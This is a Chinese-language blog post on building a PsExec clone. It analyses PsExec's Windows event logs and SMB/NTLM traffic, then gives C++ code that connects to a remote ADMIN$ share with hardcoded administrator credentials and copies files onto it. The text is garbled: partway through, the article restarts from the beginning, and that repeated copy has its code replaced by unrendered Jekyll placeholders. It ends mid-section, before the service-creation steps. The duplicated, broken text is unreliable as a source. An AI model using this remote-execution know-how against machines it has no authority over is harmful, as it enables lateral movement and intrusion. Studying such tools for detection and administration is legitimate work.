<!DOCTYPE html>
<html>

  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>如何实现一个Psexec « 倾旋的博客</title>
  <meta name="description" content="0x01 PsexecPsexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。相信很多人都用过Psexec这款工具了，它由Sysinternals网站提供，Sysinternals这个网站由Mark Russinovich于1996年创建，用于托管他的高级系统实用程...">

  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="https://payloads.online/archivers/2020-04-02/1">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="https://payloads.online/feed.xml">
</head>


  <body>

    <div class="header-placeholder"></div>
<header class="header">
  <div class="wrapper">
    <div id="sidebar-toggle">TOC</div>
    <a class="site-title" href="/">倾旋的博客</a>
    <nav class="site-nav">
      
        
        <a class="page-link" href="/about/">About</a>
      
        
        <a class="page-link" href="/posts/">Posts</a>
      
        
        <a class="page-link" href="/links/">Links</a>
      
        
        <a class="page-link" href="https://cooolis.payloads.online/">Cooolis</a>
      
        
        <a class="page-link" href="/feed.xml">RSS</a>
      
    </nav>
  </div>
</header>


    <div class="page-content">
      <div class="wrapper">
        <div class="col-main">
          <div class="post">

  <header class="post-header">
    <h1 class="post-title">如何实现一个Psexec</h1>
    <p class="post-meta">Apr 2, 2020</p>
  </header>

  <article class="post-content">
    <h2 id="0x01-psexec">0x01 Psexec</h2>

<p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。</p>

<p>相信很多人都用过Psexec这款工具了，它由Sysinternals网站提供，Sysinternals这个网站由Mark Russinovich于1996年创建，用于托管他的高级系统实用程序和技术信息。</p>

<p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p>

<p>高级用法：<a href="https://www.itprotoday.com/compute-engines/psexec">https://www.itprotoday.com/compute-engines/psexec</a></p>

<h2 id="0x02-psexec的执行原理">0x02 Psexec的执行原理</h2>

<p>为了清楚的了解它的执行原理,我们先从日志看起。</p>

<p>环境：</p>

<ul>
  <li>Windows 2008 R2 X64 → 192.168.3.130（以下简称Win2008）</li>
  <li>Kali Linux 2019.4 → 192.168.3.145（以下简称Kali）</li>
  <li>Windows 10 → 192.168.3.1（以下简称Win10）</li>
</ul>

<p>下载SysinternalsSuite： <a href="https://download.sysinternals.com/files/SysinternalsSuite.zip">https://download.sysinternals.com/files/SysinternalsSuite.zip</a></p>

<p>首先在Windows 10上对Windows 2008 R2 X64这台机器进行Psexec</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\PsExec.exe 92.168.3.130 -u administrator -p 123456 cmd
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f84fbcc5ac50a640ad1d2970c6e3b517.png" alt="2020-04-01-14-28-01"></p>

<h3 id="查看安全日志">查看安全日志</h3>

<p>打开Win2008日志查看器，先查看安全（Security）日志：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dbeee0384038a85830845641f5dd5434.png" alt="2020-04-01-14-28-34"></p>

<p>从日志查看器能够看到产生了多个安全审核日志，事件ID：4624，并且能够看到来源IP以及计算机名。</p>

<p><strong>认证类型NTLM：</strong></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/172958824ec3d6e64b5df765a216fae0.png" alt="2020-04-01-14-28-52"></p>

<p>接着，还有事件ID为4648的日志，该条目的解释是：</p>

<blockquote>
  <p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。</p>
</blockquote>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8800ced9f7f21a9999ea2095c9137421.png" alt="2020-04-01-14-29-07"></p>

<p>可以看到很明显的PSEXECSVC.exe这个程序被启动。</p>

<p><strong>目前可以猜测：先进行Windows 认证，然后产生PSEXESVC.exe并启动。</strong></p>

<h3 id="查看系统日志">查看系统日志</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6eeaab1907ebd3e03475c9f151b923c7.png" alt="2020-04-01-14-29-20"></p>

<p>事件ID：7045向系统报告了一个名为“PSEXESVC”的服务被安装，同时紧接着事件ID：7036报告“PSEXESVC服务已经启动”。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e1702df33a068121dd12f93676b5eee6.png" alt="2020-04-01-14-29-34"></p>

<p>通过事件ID报告的顺序，我们大致了解了PsEXEC的动作。</p>

<ol>
  <li>事件ID：4624</li>
  <li>事件ID：4648</li>
  <li>事件ID：7045</li>
  <li>事件ID：7036</li>
</ol>

<p>当PsExec执行exit退出交互式命令行后，会向系统报告事件ID：4634注销事件、事件ID：7036 PSEXESVC服务停止。</p>

<h2 id="0x03-从网络分析psexec利用过程">0x03 从网络分析Psexec利用过程</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a0c6703e974fab0564c0451ea0247caf.png" alt="2020-04-01-14-30-06"></p>

<p>这里我使用Wireshark抓包工具，捕获了整个Psexec建立网络连接到exit退出的整个过程。</p>

<p>认证大致流程：</p>

<ol>
  <li>192.168.3.1向192.168.3.130　进行三次握手</li>
  <li>192.168.3.1向192.168.3.130　协商认证方式</li>
  <li>192.168.3.1向192.168.3.130　发送　NTLMSSP_NEGOTIATE</li>
  <li>192.168.3.130向192.168.3.1　发送　NTLMSSP_CHANLLENGE</li>
  <li>192.168.3.1向192.168.3.130　发送　NTLMSSP_AUTH</li>
  <li>192.168.3.130向192.168.3.1　发送　ACCEPT-COMPLETED，至此完成NTLMSSP认证</li>
</ol>

<p>接着向<code class="language-plaintext highlighter-rouge">92.168.3.130\ADMIN$</code>写入<code class="language-plaintext highlighter-rouge">PSEXESVC.exe</code>:</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/993a3393e54b5fdf608c4f92ee1b56fa.png" alt="2020-04-01-14-30-37"></p>

<p>在SMBV2传输的过程中,文件内容并没有进行加密,可以直接找到DOS头：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dc7735fb04cff646efb082e5bbf75dc5.png" alt="2020-04-01-14-30-53"></p>

<blockquote>
  <p>其开始的标志字为“MZ”（MarkZbikowski，他是DOS操作系统的开发者之一），所以称它为“DOS MZ头”。</p>
</blockquote>

<p>文件传输后，Psexec会调用<code class="language-plaintext highlighter-rouge">OpenServiceManager</code> 来安装服务”PSEXESVC”：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7e46cb879e93dd42880f01eb4127fa3a.png" alt="2020-04-01-14-31-14"></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/64b132799d5d5481369e0a77907aef5f.png" alt="2020-04-01-14-31-20"></p>

<p>PSEXESVC服务启动后会与PsExec.exe构建一个管道进行传输数据(还是走SMB V2协议)：</p>

<blockquote>
  <p><a href="https://www.itprotoday.com/compute-engines/enterprise-guide-quantum-computing">The Psexesvc service creates a named pipe, psexecsvc, to which PsExec connects and sends commands that tell the service on the remote system which executable to launch and which options you’ve specified. If you specify the -d (don’t wait) switch, the service exits after starting the executable; otherwise, the service waits for the executable to terminate, then sends the exit code back to PsExec for it to print on the local console.</a></p>
</blockquote>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/80ededdce2786fb71d73467d2356bcf4.png" alt="2020-04-01-14-33-01"></p>

<p>到这里我想已经差不多足够我们实现一个PsExec了，大致过程如下：</p>

<ol>
  <li>编写PsEXESVC服务程序</li>
  <li>连接SMB共享</li>
  <li>上传文件到共享目录</li>
  <li>创建服务</li>
  <li>启动服务</li>
  <li>停止服务</li>
  <li>删除服务</li>
  <li>删除文件</li>
</ol>

<p>经过搜集资料,我发现主要有以下知识点:</p>

<ol>
  <li>SMB共享的连接与认证</li>
  <li>SMB共享的文件操作</li>
  <li>管理远程计算机服务</li>
  <li>编写服务程序</li>
</ol>

<h2 id="0x04-连接smb共享">0x04 连接SMB共享</h2>

<p>应用程序可以调用<code class="language-plaintext highlighter-rouge">WNetAddConnection</code>函数将本地设备连接到网络资源，成功的连接是持久的，这意味着系统在后续的登录操作期间会自动恢复连接。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">WNetAddConnection2W</span><span class="p">(</span>
  <span class="n">LPNETRESOURCEW</span> <span class="n">lpNetResource</span><span class="p">,</span> <span class="c1">// 指定建议的连接的详细信息</span>
  <span class="n">LPCWSTR</span>        <span class="n">lpPassword</span><span class="p">,</span> <span class="c1">// 用户名</span>
  <span class="n">LPCWSTR</span>        <span class="n">lpUserName</span><span class="p">,</span> <span class="c1">// 密码</span>
  <span class="n">DWORD</span>          <span class="n">dwFlags</span> <span class="c1">// 连接选项</span>
<span class="p">);</span>
</code></pre></div></div>

<p>在这里有详细的参数说明:<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p>

<p><strong>返回值:</strong></p>

<p>如果函数成功，则返回值为<code class="language-plaintext highlighter-rouge">NO_ERROR</code>。</p>

<p>OK，接下来我们创建一个Windows控制台应用程序,我这里使用的是<code class="language-plaintext highlighter-rouge">Visual Studio 2019</code></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/44628225123f88c2a1bfcf2088533263.png" alt="2020-04-01-14-33-54"></p>

<p>创建一个名字叫Psexec的项目：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b1a0c892a49587bc2f86c113fbb71ec6.png" alt="2020-04-01-14-34-09"></p>

<p>紧接着就可以写具体的实现代码了。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">DWORD</span> <span class="nf">ConnectSMBServer</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsHost</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsPassword</span><span class="p">)</span>
<span class="p">{</span>
    <span class="c1">// 用于存放SMB共享资源格式</span>
    <span class="n">PWCHAR</span> <span class="n">lpwsIPC</span> <span class="o">=</span> <span class="k">new</span> <span class="n">WCHAR</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span> 
    <span class="n">DWORD</span> <span class="n">dwRetVal</span><span class="p">;</span> <span class="c1">// 函数返回值</span>
    <span class="n">NETRESOURCE</span> <span class="n">nr</span><span class="p">;</span> <span class="c1">// 连接的详细信息</span>
    <span class="n">DWORD</span> <span class="n">dwFlags</span><span class="p">;</span> <span class="c1">// 连接选项</span>

    <span class="n">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">NETRESOURCE</span><span class="p">));</span>
    <span class="n">swprintf</span><span class="p">(</span><span class="n">lpwsIPC</span><span class="p">,</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"\%s</span><span class="se">\a</span><span class="s">dmin$"</span><span class="p">),</span> <span class="n">lpwsHost</span><span class="p">);</span>
    <span class="n">nr</span><span class="p">.</span><span class="n">dwType</span> <span class="o">=</span> <span class="n">RESOURCETYPE_ANY</span><span class="p">;</span> <span class="c1">// 枚举所有资源</span>
    <span class="n">nr</span><span class="p">.</span><span class="n">lpLocalName</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="n">nr</span><span class="p">.</span><span class="n">lpRemoteName</span> <span class="o">=</span> <span class="n">lpwsIPC</span><span class="p">;</span> <span class="c1">// 资源的网络名</span>
    <span class="n">nr</span><span class="p">.</span><span class="n">lpProvider</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span> 

    <span class="c1">// 如果设置了此位标志，则操作系统将在用户登录时自动尝试恢复连接。</span>
    <span class="n">dwFlags</span> <span class="o">=</span> <span class="n">CONNECT_UPDATE_PROFILE</span><span class="p">;</span> 

    <span class="n">dwRetVal</span> <span class="o">=</span> <span class="n">WNetAddConnection2</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nr</span><span class="p">,</span><span class="n">lpwsPassword</span><span class="p">,</span> <span class="n">lpwsUserName</span><span class="p">,</span> <span class="n">dwFlags</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">dwRetVal</span> <span class="o">==</span> <span class="n">NO_ERROR</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// 返回NO_ERROR则成功</span>
        <span class="n">wprintf</span><span class="p">(</span><span class="s">L"Connection added to %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">nr</span><span class="p">.</span><span class="n">lpRemoteName</span><span class="p">);</span>
        <span class="k">return</span> <span class="n">dwRetVal</span><span class="p">;</span>
    <span class="p">}</span>
    
    <span class="n">wprintf</span><span class="p">(</span><span class="s">L"WNetAddConnection2 failed with error: %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dwRetVal</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>测试过程：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a44b2835de7f7018923b522bb5536e0.png" alt="2020-04-01-14-34-46"></p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Hello World!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
        <span class="n">ConnectSMBServer</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"192.168.3.130"</span><span class="p">),</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Administrator"</span><span class="p">),</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"123456"</span><span class="p">));</span>
    <span class="p">}</span>
</code></pre></div></div>

<p>可以看到，传入对应的参数即可建立一个SMB连接。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/303724c2565d0db1f1cab5974243dbb4.png" alt="2020-04-01-14-35-14"></p>

<p>建立SMB连接后，我们需要继续编写一个通过SMB协议在远程服务器上创建文件的函数。</p>

<h3 id="关于smb上传文件">关于SMB上传文件</h3>

<p>说到这里，可能有的朋友觉得实现这个需求会非常的复杂，但是经过我的假设与验证，发现实现起来并不难，在后来的日子里，我获得了PsExec的源代码后，我这个方法比它更加方便直接。</p>

<p><strong>CIFS（Common Internet File System），它是Windows上的一个文件共享协议。</strong></p>

<p>CIFS 可以使您达到以下功能：</p>

<ol>
  <li>访问服务器本地文件并读写这些文件</li>
  <li>与其它用户一起共享一些文件块</li>
  <li>在断线时自动恢复与网络的连接</li>
  <li>使用统一码（Unicode）文件名：文件名可以使用任何字符集，而不局限于为英语或西欧语言设计的字符集。</li>
</ol>

<p>通过CIFS协议我们才能够将网络上的文件共享映射为本地资源去访问，大家可能熟悉<code class="language-plaintext highlighter-rouge">net use</code></p>

<p>但不真正了解背后的原理。既然能够将网络文件映射到本地，相当于构建了一个逻辑上的本地磁盘，进而推理出我们直接利用Windows文件相关的API来操作共享文件都是可行的。</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">CopyFile</span><span class="p">(</span> 
        <span class="n">LPCTSTR</span> <span class="n">lpExistingFileName</span><span class="p">,</span> <span class="c1">// 你要拷贝的源文件名 </span>
        <span class="n">LPCTSTR</span> <span class="n">lpNewFileName</span><span class="p">,</span> <span class="c1">// 你要拷贝的目标文件名 </span>
        <span class="n">BOOL</span> <span class="n">bFailIfExists</span> <span class="c1">// 如果目标已经存在，不拷贝（True）并返回False，覆盖目标（false）</span>
    <span class="p">);</span>
</code></pre></div></div>

<p>实现代码如下：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">BOOL</span> <span class="nf">UploadFileBySMB</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">lpwsSrcPath</span><span class="p">,</span> <span class="n">LPCWSTR</span> <span class="n">lpwsDstPath</span><span class="p">)</span>
<span class="p">{</span>
    <span class="n">DWORD</span> <span class="n">dwRetVal</span><span class="p">;</span>
    <span class="n">dwRetVal</span> <span class="o">=</span> <span class="n">CopyFile</span><span class="p">(</span><span class="n">lpwsSrcPath</span><span class="p">,</span> <span class="n">lpwsDstPath</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">dwRetVal</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">?</span> <span class="n">TRUE</span> <span class="o">:</span> <span class="n">FALSE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>是不是非常简单，它就像操作本地文件一样简单。</p>

<p>为了方便测试，我在本地创建了一个<code class="language-plaintext highlighter-rouge">test.txt</code> 文本文件，然后我把<code class="language-plaintext highlighter-rouge">wmain</code> 更改了一下：</p>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">wmain</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">wchar_t</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Hello World!</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ConnectSMBServer</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"192.168.3.130"</span><span class="p">),</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"Administrator"</span><span class="p">),</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"123456"</span><span class="p">))</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">BOOL</span> <span class="n">bRetVal</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
        <span class="n">bRetVal</span><span class="o">=</span><span class="n">UploadFileBySMB</span><span class="p">(</span><span class="n">TEXT</span><span class="p">(</span><span class="s">"C:\Users\Administrator</span><span class="se">\t</span><span class="s">est.txt"</span><span class="p">),</span> <span class="n">TEXT</span><span class="p">(</span><span class="s">"92.168.3.130</span><span class="se">\a</span><span class="s">dmin$</span><span class="se">\t</span><span class="s">est.txt"</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">bRetVal</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Write Success !</span><span class="se">\n</span><span class="s">"</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span>
            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">GetLastError</span><span class="p">()</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1751da6474c932f7644f8a7cb7450867.png" alt="2020-04-01-14-36-24"></p>

<p>在Win2008上的`C:\Windows## 0x01 Psexec</p>

<p>Psexec被编写的初衷是为了方便服务器管理员管理大量的机器而开发的，但由于它的便捷，同时也被黑客使用。</p>

<p>相信很多人都用过Psexec这款工具了，它由Sysinternals网站提供，Sysinternals这个网站由Mark Russinovich于1996年创建，用于托管他的高级系统实用程序和技术信息。</p>

<p>下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p>

<p>高级用法：<a href="https://www.itprotoday.com/compute-engines/psexec">https://www.itprotoday.com/compute-engines/psexec</a></p>

<h2 id="0x02-psexec的执行原理-1">0x02 Psexec的执行原理</h2>

<p>为了清楚的了解它的执行原理,我们先从日志看起。</p>

<p>环境：</p>

<ul>
  <li>Windows 2008 R2 X64 → 192.168.3.130（以下简称Win2008）</li>
  <li>Kali Linux 2019.4 → 192.168.3.145（以下简称Kali）</li>
  <li>Windows 10 → 192.168.3.1（以下简称Win10）</li>
</ul>

<p>下载SysinternalsSuite： <a href="https://download.sysinternals.com/files/SysinternalsSuite.zip">https://download.sysinternals.com/files/SysinternalsSuite.zip</a></p>

<p>首先在Windows 10上对Windows 2008 R2 X64这台机器进行Psexec</p>

<p>&lt;!JEKYLL@5920@0&gt;</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/f84fbcc5ac50a640ad1d2970c6e3b517.png" alt="2020-04-01-14-28-01"></p>

<h3 id="查看安全日志-1">查看安全日志</h3>

<p>打开Win2008日志查看器，先查看安全（Security）日志：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dbeee0384038a85830845641f5dd5434.png" alt="2020-04-01-14-28-34"></p>

<p>从日志查看器能够看到产生了多个安全审核日志，事件ID：4624，并且能够看到来源IP以及计算机名。</p>

<p><strong>认证类型NTLM：</strong></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/172958824ec3d6e64b5df765a216fae0.png" alt="2020-04-01-14-28-52"></p>

<p>接着，还有事件ID为4648的日志，该条目的解释是：</p>

<blockquote>
  <p>在进程尝试通过显式指定帐户的凭据来登录该帐户时生成此事件。这通常发生在批量类型的配置中(例如计划任务) 或者使用 RUNAS 命令时。</p>
</blockquote>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/8800ced9f7f21a9999ea2095c9137421.png" alt="2020-04-01-14-29-07"></p>

<p>可以看到很明显的PSEXECSVC.exe这个程序被启动。</p>

<p><strong>目前可以猜测：先进行Windows 认证，然后产生PSEXESVC.exe并启动。</strong></p>

<h3 id="查看系统日志-1">查看系统日志</h3>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/6eeaab1907ebd3e03475c9f151b923c7.png" alt="2020-04-01-14-29-20"></p>

<p>事件ID：7045向系统报告了一个名为“PSEXESVC”的服务被安装，同时紧接着事件ID：7036报告“PSEXESVC服务已经启动”。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/e1702df33a068121dd12f93676b5eee6.png" alt="2020-04-01-14-29-34"></p>

<p>通过事件ID报告的顺序，我们大致了解了PsEXEC的动作。</p>

<ol>
  <li>事件ID：4624</li>
  <li>事件ID：4648</li>
  <li>事件ID：7045</li>
  <li>事件ID：7036</li>
</ol>

<p>当PsExec执行exit退出交互式命令行后，会向系统报告事件ID：4634注销事件、事件ID：7036 PSEXESVC服务停止。</p>

<h2 id="0x03-从网络分析psexec利用过程-1">0x03 从网络分析Psexec利用过程</h2>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/a0c6703e974fab0564c0451ea0247caf.png" alt="2020-04-01-14-30-06"></p>

<p>这里我使用Wireshark抓包工具，捕获了整个Psexec建立网络连接到exit退出的整个过程。</p>

<p>认证大致流程：</p>

<ol>
  <li>192.168.3.1向192.168.3.130　进行三次握手</li>
  <li>192.168.3.1向192.168.3.130　协商认证方式</li>
  <li>192.168.3.1向192.168.3.130　发送　NTLMSSP_NEGOTIATE</li>
  <li>192.168.3.130向192.168.3.1　发送　NTLMSSP_CHANLLENGE</li>
  <li>192.168.3.1向192.168.3.130　发送　NTLMSSP_AUTH</li>
  <li>192.168.3.130向192.168.3.1　发送　ACCEPT-COMPLETED，至此完成NTLMSSP认证</li>
</ol>

<p>接着向&lt;!JEKYLL@5920@1&gt;写入&lt;!JEKYLL@5920@2&gt;:</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/993a3393e54b5fdf608c4f92ee1b56fa.png" alt="2020-04-01-14-30-37"></p>

<p>在SMBV2传输的过程中,文件内容并没有进行加密,可以直接找到DOS头：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/dc7735fb04cff646efb082e5bbf75dc5.png" alt="2020-04-01-14-30-53"></p>

<blockquote>
  <p>其开始的标志字为“MZ”（MarkZbikowski，他是DOS操作系统的开发者之一），所以称它为“DOS MZ头”。</p>
</blockquote>

<p>文件传输后，Psexec会调用&lt;!JEKYLL@5920@3&gt; 来安装服务”PSEXESVC”：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/7e46cb879e93dd42880f01eb4127fa3a.png" alt="2020-04-01-14-31-14"></p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/64b132799d5d5481369e0a77907aef5f.png" alt="2020-04-01-14-31-20"></p>

<p>PSEXESVC服务启动后会与PsExec.exe构建一个管道进行传输数据(还是走SMB V2协议)：</p>

<blockquote>
  <p><a href="https://www.itprotoday.com/compute-engines/enterprise-guide-quantum-computing">The Psexesvc service creates a named pipe, psexecsvc, to which PsExec connects and sends commands that tell the service on the remote system which executable to launch and which options you’ve specified. If you specify the -d (don’t wait) switch, the service exits after starting the executable; otherwise, the service waits for the executable to terminate, then sends the exit code back to PsExec for it to print on the local console.</a></p>
</blockquote>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/80ededdce2786fb71d73467d2356bcf4.png" alt="2020-04-01-14-33-01"></p>

<p>到这里我想已经差不多足够我们实现一个PsExec了，大致过程如下：</p>

<ol>
  <li>编写PsEXESVC服务程序</li>
  <li>连接SMB共享</li>
  <li>上传文件到共享目录</li>
  <li>创建服务</li>
  <li>启动服务</li>
  <li>停止服务</li>
  <li>删除服务</li>
  <li>删除文件</li>
</ol>

<p>经过搜集资料,我发现主要有以下知识点:</p>

<ol>
  <li>SMB共享的连接与认证</li>
  <li>SMB共享的文件操作</li>
  <li>管理远程计算机服务</li>
  <li>编写服务程序</li>
</ol>

<h2 id="0x04-连接smb共享-1">0x04 连接SMB共享</h2>

<p>应用程序可以调用&lt;!JEKYLL@5920@4&gt;函数将本地设备连接到网络资源，成功的连接是持久的，这意味着系统在后续的登录操作期间会自动恢复连接。</p>

<p>&lt;!JEKYLL@5920@5&gt;</p>

<p>在这里有详细的参数说明:<a href="https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w">https://docs.microsoft.com/zh-cn/windows/win32/api/winnetwk/nf-winnetwk-wnetaddconnection2w</a></p>

<p><strong>返回值:</strong></p>

<p>如果函数成功，则返回值为&lt;!JEKYLL@5920@6&gt;。</p>

<p>OK，接下来我们创建一个Windows控制台应用程序,我这里使用的是&lt;!JEKYLL@5920@7&gt;</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/44628225123f88c2a1bfcf2088533263.png" alt="2020-04-01-14-33-54"></p>

<p>创建一个名字叫Psexec的项目：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/b1a0c892a49587bc2f86c113fbb71ec6.png" alt="2020-04-01-14-34-09"></p>

<p>紧接着就可以写具体的实现代码了。</p>

<p>&lt;!JEKYLL@5920@8&gt;</p>

<p>测试过程：</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/1a44b2835de7f7018923b522bb5536e0.png" alt="2020-04-01-14-34-46"></p>

<p>&lt;!JEKYLL@5920@9&gt;</p>

<p>可以看到，传入对应的参数即可建立一个SMB连接。</p>

<p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/303724c2565d0db1f1cab5974243dbb4.png" alt="2020-04-01-14-35-14"></p>

<p>建立SMB连接后，我们需要继续编写一个通过SMB协议在远程服务器上创建文件的函数。</p>

<h3 id="关于smb上传文件-1">关于SMB上传文件</h3>

<p>说到这里，可能有的朋友觉得实现这个需求会非常的复杂，但是经过我的假设与验证，发现实现起来并不难，在后来的日子里，我获得了PsExec的源代码后，我这个方法比它更加方便直接。</p>

<p><strong>CIFS（Common Internet File System），它是Windows上的一个文件共享协议。</strong></p>

<p>CIFS 可以使您达到以下功能：</p>

<ol>
  <li>访问服务器本地文件并读写这些文件</li>
  <li>与其它用户一起共享一些文件块</li>
  <li>在断线时自动恢复与网络的连接</li>
  <li>使用统一码（Unicode）文件名：文件名可以使用任何字符集，而不局限于为英语或西欧语言设计的字符集。</li>
</ol>

<p>通过CIFS协议我们才能够将网络上的文件共享映射为本地资源去访问，大家可能熟悉&lt;!JEKYLL@5920@10&gt;</p>

<p>但不真正了解背后的原理。既然能够将网络文件映射到本地，相当于构建了一个逻辑上的本地磁盘，进而推理出我们直接利用Windows文件相关的API来操作共享文件都是可行的。</p>

<p>&lt;!JEKYLL@5920@11&gt;</p>

<p>实现代码如下：</p>

<p>&lt;!JEKYLL@5920@12&gt;</p>

<p>是不是非常简单，它就像操作本地文件一样简单。</p>

<p>为了方便测试，我在本地创建了一个&lt;!JEKYLL@5920@13&gt; 文本文件，然后我把&lt;!JEKYLL@5920@14&gt; 更改了一下：</p>

